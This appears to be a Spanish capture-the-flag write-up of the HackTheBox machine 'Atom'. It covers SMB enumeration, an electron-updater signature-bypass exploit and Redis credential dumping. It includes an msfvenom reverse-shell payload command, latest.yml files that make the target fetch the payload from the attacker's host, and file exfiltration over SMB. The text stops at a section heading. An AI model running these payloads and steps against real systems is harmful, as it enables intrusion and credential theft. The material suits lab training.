---
layout      : post
title       : "HackTheBox - Atom"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png
category    : [ htb ]
tags        : [ redis, kanban, electron, SMB ]
---
Máquina **Windows** nivel medio. Jugaremos con **SMB**, recrearemos actualizaciones (feature de **electron**) en binarios para que sean ejecutados por un equipo de **QA** y encontraremos la relación amorosa entre **Redis** y **Kanban** que nos permitirá desencriptar contraseñas del propio **Redis**.

![340atomHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340atomHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [MrR3boot](https://www.hackthebox.eu/profile/13531).

A quemarnossssssss

**Atom** es una máquina que nos ofrece un servicio web con un comprimido a ser descargado (poco hicimos con él (o bueno, poco mostré :P)) con un binario `.exe`, también tendremos una carpeta compartida con **SAMBA**, de ella obtendremos un archivo `.pdf`. Nos damos cuenta de que es un manual de usuario indicándonos algunos pasos interesantes...

Principalmente en la carpeta compartida hay 3 carpetas dentro, ellas están relacionadas con un equipo de **QA** que va a estar verificando esas 3 carpetas en busca de cositas y si X cosa pasa lo ejecutara, esas cositas se llaman actualizaciones. Pero las actualizaciones tienen que estar relacionadas con [**electron-builder**](https://www.electron.build/)) (pista del **PDF**), investigando encontraremos una vulnerabilidad contra **electron-builder** que nos permite ejecutar comandos remotamente a través de un fallo en un **feature** (que se enfoca en encontrar actualizaciones en binarios), acá entran en juego las 3 carpetas.

Nosotros tendremos que recrear una actualización de un binario (malicioso), esto a través del archivo `latest.yml` (que el **feature** (equipo de **QA**) va a estar buscando constantemente en las carpetas de actualizaciones), con esto lograremos que la máquina (feature/QA) ejecute el binario y en nuestro caso nos devuelva una **Reverse Shell** como el usuario **jason**. (Un poco (bastante) difícil explicar esa parte en poquitas líneas).

> [**electroPWn.py**, script que automatiza este proceso y nos devuelve una Shell](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/atom/electroPWn.py).

Estando dentro de la máquina enumeraremos el servicio **Redis**, encontraremos unas credenciales en un archivo de configuración que nos servirán para jugar dentro del servidor.

Enumerando la base de datos tendremos otras credenciales en este caso del usuario **Administrator**, pero la contraseña estará encriptada... Estando perdidos sin saber como desencriptarla enumeraremos de nuevo y veremos que **kanban** y **redis** están relacionados, **kanban** le da la interfaz y redis el backend para guardar información, por lo que la data encontrada (las credenciales) llegaron desde **kanban** a **redis**... 

Usaremos un exploit encargado de desencriptar contraseñas generadas desde **kanban**, con esto obtendremos en texto plano la contraseña del usuario **Administrator**. 

Haciendo reutilización de contraseñas (y usando **evil-winrm**) conseguiremos una **Shell** en el sistema como **Administrator**.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

Camino de verdades y rarezas:

1. [Enumeración](#enumeracion).
  * [Enumeración de puertos con **nmap**](#enum-nmap).
2. [Explotación](#explotacion).
  * [(EL FAIL) Generando **latest.yml**, binario malicioso y hash sha512](#expl-f-yml-bin-hash).
  * [(EL BUENARDO) Generando **latest.yml**, binario malicioso y hash sha512](#expl-yml-bin-hash).
  * [Obtención **Reverse Shell** usuario **jason**](#expl-revsh-jason).
3. [Escalada de privilegios](#escalada-de-privilegios).
  * [Acceso servidor **redis** credenciales encontradas en archivo **.conf**](#privesc-redis).
  * [Dumpeo base de datos **redis**](#privesc-dump-redis).
  * [Desencriptamos la contraseña del usuario **Administrator**](#privesc-encrypted-revealed).

...

## Enumeración [#](#enumeracion) {#enumeracion}

---

### Enumeración de puertos con *nmap* [⌖](#enum-nmap) {#enum-nmap}

Empezaremos jugando con **nmap** para ver que servicios esta corriendo la máquina:

```bash
❱ nmap -p- --open -v 10.10.10.237 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Obtenemos:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Wed Jun 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.237
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.237 ()   Status: Up
Host: 10.10.10.237 ()   Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 5985/open/tcp//wsman///, 6379/open/tcp//redis///  Ignored State: filtered (65529)
# Nmap done at Wed Jun 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 202.56 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos provee de un servidor web. |
| 135    | **[RPC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)**: Permite la comunicación entre programas. |
| 443    | **[HTTPS](https://es.wikipedia.org/wiki/Protocolo_seguro_de_transferencia_de_hipertexto)**: Es un servidor web con un certificado "seguro". |
| 445    | **[SMB](https://www.varonis.com/blog/smb-port/)**: Nos ayuda a la transferencia de archivos en una red. |
| 5985   | **[WinRM](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/)**: Nos permite realizar tareas administrativas remotamente (entre muuuchas cosas +). |
| 6379   | **[Redis](https://blog.bi-geek.com/redis-para-principiantes/)**: Motor BD para almacenar datos en memoria. |

Ahora que tenemos los puertos activos, hagamos un escaneo más profundo, tratando asi de identificar que versiones y scripts están relacionados con cada servicio:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.237
    [*] Open ports: 80,135,443,445,5985,6379

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 80,135,443,445,5985,6379 -sC -sV 10.10.10.237 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y ahora el escaneo nos responde con:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Wed Jun 23 25:25:25 2021 as: nmap -p 80,135,443,445,5985,6379 -sC -sV -oN portScan 10.10.10.237
Nmap scan report for 10.10.10.237
Host is up (0.11s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h23m50s, deviation: 4h02m32s, median: 3m48s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-23T10:26:40-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-23T17:26:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 69.09 seconds
```

Encontramos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27 |
| 443    | HTTPS    | Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27 |
| 445    | SMB      | Windows 10 Pro 19042 (Windows 10 Pro 6.3) |

Pero no encontramos nada más, así que empecemos a explorar cada puerto y veamos cuál será nuestra entrada (:

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![340page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340page80.png)

![340page80_2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340page80_2.png)

Encontramos una descripción que nos habla sobre una aplicación para tomar notas... Vemos un email:

* `MrR3boot@atom.htb`, del cual podemos extraer:
  * el usuario (`MrR3boot`) 
  * y el dominio (`atom.htb`).

Y que si colocamos el mouse sobre el botón `Download for Windows`, nos redireccionara a `/releases/heed_setup_v1.0.0.zip`, o sea nos descargara un comprimido `.zip`:

![340page80_downloadforwin_hovering](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340page80_downloadforwin_hovering.png)

Pues démosle clic :P

Obtenemos:

```bash
❱ file heed_setup_v1.0.0.zip 
heed_setup_v1.0.0.zip: Zip archive data, at least v2.0 to extract
```

Y al hacer la extracción encontramos un binario `.exe` al parecer de instalación:

```bash
❱ unzip heed_setup_v1.0.0.zip 
Archive:  heed_setup_v1.0.0.zip
  inflating: heedv1 Setup 1.0.0.exe
```

Jmmm, en mi máquina no puedo probarlo, ya que tengo un problema con **wine**, por lo tanto debería jugar con el binario pero en una máquina virtual **Windows** :/

Pero antes de intentar cualquier cosa veamos si encontramos alguna cadena de texto en el binario:

```bash
❱ strings heedv1\ Setup\ 1.0.0.exe
```

Al final del resultado vemos que se repite 3 veces esto:

```bash
...
Athens1
London1
HackTheBox1
HackTheBox1
HackTheBox1
admin@htb.local0
...
```

Lo más probable es que no sea nada pero pues por si algo e.e

Exploremos el servicio **SMB** antes de movernos de VM.

...

### Puerto 445 [⌖](#puerto-445) {#puerto-445}

Con el protocolo **SAMBA** podemos compartir recursos a traves de la red (entre muchas cositas más), existen herramietnas que nos ayudan a validar la existencia de recursos compartidos, una de ellas es [smbmap](https://www.hackplayers.com/2015/05/smbmap-busca-carpetas-windows-desde-kali.html), usemosla y veamos si encontramos algo:

**Jugamos con credenciales "nulas" ya que no tenemos reales.**

```bash
❱ smbmap -H 10.10.10.237 -u 'null' -p 'null'
[+] Guest session       IP: 10.10.10.237:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Software_Updates                                        READ, WRITE
```

Bien, vemos 4 recursos pero solo 1 interesante: **Software_Updates**, a el tenemos acceso de lectura yyy escritura, profundicemos en él con ayuda de [smbclient](https://jcsis.wordpress.com/2011/08/26/acceder-a-recurso-compartido-desde-un-terminal-linux-con-smbclient/):

```bash
❱ smbclient //10.10.10.237/Software_Updates -U 'null'
Enter WORKGROUP\null's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun 23 13:04:00 2021
  ..                                  D        0  Wed Jun 23 13:04:00 2021
  client1                             D        0  Wed Jun 23 13:04:00 2021
  client2                             D        0  Wed Jun 23 13:04:00 2021
  client3                             D        0  Wed Jun 23 13:04:00 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 06:18:08 2021

                4413951 blocks of size 4096. 1367275 blocks available
smb: \> 
```

Opa, más directorios, pero dentro de ellos no encontramos nada, así que solo nos queda el archivo `.pdf`, descarguémoslo a nuestra máquina y veamos que contiene:

```bash
smb: \> prompt off
smb: \> mget UAT_Testing_Procedures.pdf
getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (61,2 KiloBytes/sec) (average 61,2 KiloBytes/sec)
```

```bash
❱ file UAT_Testing_Procedures.pdf 
UAT_Testing_Procedures.pdf: PDF document, version 1.3
```

...

## Explotación [#](#explotacion) {#explotacion}

Bien, usemos [xdg-open](https://linux.die.net/man/1/xdg-open) para ver el **PDF**:

```bash
❱ xdg-open UAT_Testing_Procedures.pdf
```

Yyyyy:

![340bash_pdf_UAT1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_UAT1.png)

![340bash_pdf_UAT2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_UAT2.png)

Destacamos varias cosas muyyy interesantes de cara a la explotación:

* Fue creado con **electron-builder** (puede ser relevante, no lo sabemos).
* `Update server running` hace referencia a la carpeta compartida `Software_Updates` entiendo yo.
* "client folders", ya los vimos (y vimos que tenemos permisos de escritura sobre ellos).
* El equipo de pruebas (**QA**) tomara el contenido de esas carpetas "`client`" y verificara si existen cambios, si los hay los instalará como si fuera una "actualización".
  * **Por lo tanto podemos pensar que debemos modificar el binario `.exe` agregando contenido malicioso, subirlo a alguna carpeta `client` y el sistema lo ejecutará, por lo tanto ejecutaría el contenido malicioso, ¿no?** A DARLE!!

Buscando en internet cositas sobre **electron builder exploit** llegamos a varios recursos:

* [RCE using XSS in Electron applications](https://sghosh2402.medium.com/cve-2020-16608-8cdad9f4d9b4).
* [The dangers of Electron's **shell.openExternal()**](https://benjamin-altpeter.de/shell-openexternal-dangers/).

Pero el master de los masters es este, con él seguiremos el resto del writeup:

* [Signature Validation Bypass Leading to RCE In Electron-Updater](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html).

En él se habla de un feature llamado `electron-updater`, el cual se encarga de **auto** actualizar software (lo que estábamos hablando antes, pero automatizado), esto lo hace comparando los valores de `publisherName` (del binario que ya esta instalado) y el certificado `Common Name` (del binario a ser instalado)... (**Esto toma sentido mirando el código fuente, ya que vemos las comparativas:**)

![340google_signature_code_comparation](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340google_signature_code_comparation.png)

> **Tomada del propio artículo**.

Nos indica que en cada actualización, el servidor o aplicación va a estar buscando un archivo llamado `latest.yml`, en él estaría el nombre, ruta y hash relacionado con el programa, básicamente la definición de lo que queramos actualizar...

En el código vemos al inicio una ejecucion llamativa, que llevada a la acción tomaría estos valores (por ejemplo):

> ```powershell
> powershell.exe -NoProfile -NonInteractive -InputFormat None -Command "Get-AuthenticodeSignature 'C:\Users\carlitos\AppData\Roaming\vulnerable_app\__update__\new_update.exe' | ConvertTo-Json -Compress"
> ```

Donde `C:\Users....exe` es un valor tomado de la variable `tempUpdateFile`, acá es donde entramos nosotros como atacantes (:

Como la variable `tempUpdateFile` no tiene ningún filtro o cuenta con algún escape, podemos forzar un bypass a la validación de `publisherName` y `Common Name` mediante un error en la ejecucion del script.

Esto de una manera muy sencilla, solo debemos crear un binario con una `'` en el nombre y esto hará que el programa falle, peeeero para que sea ejecutado necesitamos generar un hash que se relacione con el programa creado, así logramos que el actualizador tome nuestro programa como legítimo.

Pues démosle, generemos el archivo `latest.yml`, el binario malicioso yyyy el hash de ese binario:

...

### (FAIL) <u>latest.yml</u>, bin malicioso y hash [⌖](#expl-f-yml-bin-hash) {#expl-f-yml-bin-hash}

Siguiendo el artículo y sus pocs tendríamos:

**try\'now.exe (binario malicioso):**

Generaremos un binario que a la hora de ejecutarse nos lance una reverse Shell, ayudémonos de [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) para esto:

```bash
❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.103 LPORT=4433 -f exe -o try\'now.exe
```

```bash
❱ file "try'now.exe"
try'now.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

Ahora generamos el hash identificador (el propio blog nos provee de esta línea):

**sha512 hash:**

```bash
❱ shasum -a 512 try\'now.exe | cut -d " " -f 1 | xxd -r -p | base64 | tr -d '\n'
0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
```

Y por último el archivo que estará buscando el servidor.

**latest.yml:**

*(Una de las tantas pruebas)*

```yml
version: 1.2.3
files:
  - url: try';try\'now.exe;'now.exe
  sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
  size: 73802
path: try';try\'now.exe;'now.exe
sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
releaseDate: '2019-11-20T11:17:02.627Z'
```

Y con esto ya tendriamos los 3 pasos, el caso es que el script leeria el archivo `latest.yml`, daria error en `try'` y en teoria deberia ejecutar `try\'now.exe`, o sea, nuestro payload con la Reverse Shell...

Lo unico que nos quedaria hacer seria, subir el binario `try'now.exe` y el objeto `latest.yml` a alguna de las carpetas `client` y ver si pasa algo (: ***Spoiler: No pasa nada :P***

Pero antes, nos ponemos en escucha con ayuda de **netcat** por el puerto que indicamos en el binario malicioso: 

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Ahora si:

```bash
❱ smbclient //10.10.10.237/Software_Updates -U 'null'
Enter WORKGROUP\null's password: 
Try "help" to get a list of possible commands.
smb: \> cd client2
```

```bash
smb: \client2\> put try'now.exe 
putting file try'now.exe as \client2\try'now.exe (43,3 kb/s) (average 43,3 kb/s)
smb: \client2\> put latest.yml 
putting file latest.yml as \client2\latest.yml (0,4 kb/s) (average 34,5 kb/s)
```

Entiendo que generaría el error y en la misma ruta en la que esta el objeto `latest.yml` buscara el binario `try'now.exe` y lo ejecutara...

Pues nada, probé y probé cosas, cambie la ruta, me invente otras, jugué para en tal caso diera error ejecutara despues `certutil.exe ...`, pero tampoco, bueno, varias cositas hice, hasta que por fin probé algo que funciono...

...

### (EL GOOD) <u>latest.yml</u>, bin malicioso y hash [⌖](#expl-yml-bin-hash) {#expl-yml-bin-hash}

Tomando nuestro archivo `latest.yml` me fui pa la web a buscar ejemplos de él, llegamos a este:

* [Auto Update - Staged Rollouts, Electron Build Docs](https://www.electron.build/auto-update#staged-rollouts).

En él tenemos esta estructura:

![340google_electron_docs_latestYML](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340google_electron_docs_latestYML.png)

Así que la tome y empece a jugar con ella, quitando así el apartado **files** que había antes (y como **stagingPercentage** no estaba en el artículo inicial, también lo quite):

```yml
version: 1.2.3
path: try\'now.exe
sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
```

Pero nadita de nadita...

En un momento se me dio por probar colocar una ruta hacia algún servidor web en **path**, ahí me cambio la cara:

Levantamos el servidor web:

```bash
❱ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y ahora nuestro archivo `latest.yml` quedaría así:

```yml
version: 1.2.3
path: http://10.10.14.103:8000/try'now.exe
sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
```

Lo subimos al servidor **SMB**:

```bash
smb: \client2\> put latest.yml
```

Y en nuestro servidor web recibimos:

```bash
❱ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.237 - - [23/Jun/2021 25:25:25] code 404, message File not found
10.10.10.237 - - [23/Jun/2021 25:25:25] "GET /try'now.exe.blockmap HTTP/1.1" 404 -
10.10.10.237 - - [23/Jun/2021 25:25:25] "GET /try%27now.exe HTTP/1.1" 200 -
```

Opa opa opaaaa, vaya cosa extrañaaaa, peeero tenemos respuesta (:

Yyyy en nuestro listener que teníamos de antes recibimooooooooooooooooooooooooooos:

![340bash_jasonRevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_jasonRevSH.png)

:O

Pero siento que quedo desorganizado, así que haremos una vez más el proceso mucho más directo:

### Obtenemos Reverse Shell como <u>jason</u> [⌖](#expl-revsh-jason) {#expl-revsh-jason}

Generamos **binario `.exe` malicioso**:

```bash
❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.103 LPORT=4433 -f exe -o try\'now.exe
```

Le volvemos a generar un hash, ya que si cambia el contenido del programa, cambia el hash:

> Si el programa es el mismo no hace falta volver a generarlo, ya que toma el hash, lo busca en las "updates" y ejecuta lo que este relacionado a él, o sea, no necesitariamos el servidor web.

```bash
❱ shasum -a 512 "try'now.exe" | cut -d " " -f1 | xxd -r -p | base64 | tr -d '\n'
AOztWPlDvzM4pyop/YcVeKbFXQzDOSRrtOb0NUGfxeDPaDTfRJtu/qDYmXjh76gMbsZx4coGmgCvxUQ1J48dXQ==
```

Ahora actualizamos el archivo `latest.yml`:

```yml
version: 1.2.3
path: http://10.10.14.103:8000/try'now.exe
sha512: AOztWPlDvzM4pyop/YcVeKbFXQzDOSRrtOb0NUGfxeDPaDTfRJtu/qDYmXjh76gMbsZx4coGmgCvxUQ1J48dXQ==
```

Nos ponemos en escucha, tanto por el servidor web como por **netcat** (puerto **4433**).

Subimos el objeto `latest.yml` a alguna carpeta compartida:

```bash
smb: \client2\> put latest.yml 
```

Yyyyy en nuestro listener tendríamos la **Reverse Shell** (:

> La idea que teniamos de modificar el binario con cositas maliciosas cayo en picada :( no era tan por ahí, pero igual no estabamos TAAAAN erroneos e.e

...

> [Script que nos automatiza todo el proceso y genera Shell, **electroPWn.py**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/atom/electroPWn.py).

![340bash_electroPWn_py](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_electroPWn_py.png)

***(Ten en cuenta que más o menos cada 30 segundos ejecuta lo que hay en las carpetas cliente, entonces puede ser random que te lance la*** Reverse Shell ***en el tiempo que esta escuchando el programa (igual puedes jugar con esos tiempos), pero de 10 intentos, 7 me la devolvió en una sola ejecución.)*** Pero repito, **es bastante random** :(

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando el sistema (y recordando nuestro escaneo de **nmap**) encontramos cositas relacionadas con el servicio [Redis](https://blog.bi-geek.com/redis-para-principiantes/) en la ruta `C:\Program Files\Redis`:

```powershell
PS C:\Program Files\Redis> dir

    Directory: C:\Program Files\Redis

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/2/2021   7:31 AM                Logs
-a----          7/1/2016   3:54 PM           1024 EventLog.dll
-a----          7/1/2016   3:52 PM          12618 Redis on Windows Release Notes.docx
-a----          7/1/2016   3:52 PM          16769 Redis on Windows.docx
-a----          7/1/2016   3:55 PM         406016 redis-benchmark.exe
-a----          7/1/2016   3:55 PM        4370432 redis-benchmark.pdb
-a----          7/1/2016   3:55 PM         257024 redis-check-aof.exe
-a----          7/1/2016   3:55 PM        3518464 redis-check-aof.pdb
-a----          7/1/2016   3:55 PM         268288 redis-check-dump.exe
-a----          7/1/2016   3:55 PM        3485696 redis-check-dump.pdb
-a----          7/1/2016   3:55 PM         482304 redis-cli.exe
-a----          7/1/2016   3:55 PM        4517888 redis-cli.pdb
-a----          7/1/2016   3:55 PM        1553408 redis-server.exe
-a----          7/1/2016   3:55 PM        6909952 redis-server.pdb
-a----          4/2/2021   7:39 AM          43962 redis.windows-service.conf
-a----          4/2/2021   7:37 AM          43960 redis.windows.conf
-a----          7/1/2016   9:17 AM          14265 Windows Service Documentation.docx
```

Vemos dos archivos de configuración:

```powershell
...
-a----          4/2/2021   7:39 AM          43962 redis.windows-service.conf
-a----          4/2/2021   7:37 AM          43960 redis.windows.conf
...
```

Inicialmente no encontré nada en ellos, seguí y seguí, me perdí y despues caí en esta guía:

* [6379 - Pentesting **Redis**](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis).

En ella se habla de una autenticación necesaria para jugar con **redis** y que en algunos casos es posible encontrarse contraseñas en archivos `.conf` dentro del parámetro `requirepass`:

![340google_redis_hacktricks_requirepass](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340google_redis_hacktricks_requirepass.png)

### Acceso servidor <u>Redis</u> - archivo <u>.conf</u> [⌖](#privesc-redis) {#privesc-redis}

Probando a buscar esa cadena (el parámetro) en los archivos de configuración encontramos algo:

```powershell
PS C:\Program Files\Redis> type redis.windows-service.conf | Select-String -Pattern 'requirepass' 

requirepass kidvscat_yes_kidvscat
# If the master is password protected (using the "requirepass" configuration
# requirepass foobared
```

Vemos 3 resultados, pero solo uno sin comentarios (`#`), tomemos esa cadena y juguemos ahora con la utilidad [redis-cli](https://redis.io/topics/rediscli), con ella podemos movernos entre servidores de DB **redis**, usando el parámetro `auth` dentro de la consola de **redis** le concatenamos la cadena encontrada (que sería la pw):

```bash
❱ redis-cli -h 10.10.10.237
10.10.10.237:6379> auth hola123
(error) ERR invalid password
10.10.10.237:6379> auth kidvscat_yes_kidvscat
OK
```

Perfecto, tamos dentro del servidor **redis**, apoyándonos de la misma [guía](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#dumping-database) podemos dumpear las bases de datos existentes:

### Dumpeamos la base de datos <u>Redis</u> [⌖](#privesc-dump-redis) {#privesc-dump-redis}

Primero vemos cuantas DB hay:

```bash
10.10.10.237:6379> info
...
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Solo una base de datos con indice `0`, juguemos con ella:

```bash
10.10.10.237:6379> SELECT 0
OK
```

```bash
10.10.10.237:6379> KEYS *
1) "pk:ids:MetaDataClass"
2) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
4) "pk:ids:User"
```

4 llaves, para dumpear sus valores debemos usar `GET <key>`, al jugar con la **3** encontramos esto:

```bash
10.10.10.237:6379> GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
```

```json
"{
  "Id":"e8e29158d70d44b1a1ba4949d52790a0",
  "Name":"Administrator",
  "Initials":"",
  "Email":"",
  "EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi",
  "Role":"Admin",
  "Inactive":false,
  "TimeStamp":637530169606440253
}"
```

Bien, información de un usuario llamado **Administrator** y entre ella una contraseña encriptada (:

Buscando maneras de desencriptarla no llegamos a ningún resultado, acá me reperdi un buen rato, así que decidí buscar ayuda...

Me indicaron que enumerara el directorio de **jason** (`c:\Users\jason`) (cosa que ya había hecho, peeeeero sobre vi algunas cosas)...

En el directorio `c:\Users\jason\Downloads` vemos una carpeta llamada `PortableKanban` y en ella varios objetos de **kanban**, uno de ellos es la guía para el usuario:

```powershell
PS C:\Users\jason\Downloads\PortableKanban> dir

    Directory: C:\Users\jason\Downloads\PortableKanban

Mode                 LastWriteTime         Length Name
...
-a----          1/4/2018   8:14 PM        1050092 User Guide.pd
```

Copiándonoslo a nuestra máquina, abriéndolo con `xdg-open` y leyéndolo caemos en cuenta de algo...

**(Podemos copiarlo fácilmente compartiéndonos una carpeta con *SMB* (o incluso colocándolo en la carpeta compartida que ya existe en la máquina)).

Levantamos carpeta llamada `smbFolder`:

```bash
❱ smbserver.py smbFolder $(pwd) -smb2support
```

Y desde **Windows** indicamos:

```powershell
PS C:\Users\jason\Downloads\PortableKanban> copy "User Guide.pdf" \\10.10.14.103\smbFolder\"User Guide.pdf"
```

Ya lo tendríamos:

```bash
❱ file User\ Guide.pdf 
User Guide.pdf: PDF document, version 1.7
```

Lo abrimos y:

![340bash_pdf_kanban1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_kanban1.png)

Así que todo lo que pase por **kanban** debe ser manejado desde **redis**...

![340bash_pdf_kanban2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_kanban2.png)

Y (lo que ya sabíamos) que existe un archivo con todas las configuraciones del servidor **redis** llamado `redis.windows-service.conf`.

![340bash_pdf_kanban3](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_kanban3.png)

Y vemos la estructura de la tabla de la cual encontramos valores anteriormente (los de **administrator**)...

### Desencriptamos la contraseña de <u>Administrator</u> [⌖](#privesc-encrypted-revealed) {#privesc-encrypted-revealed}

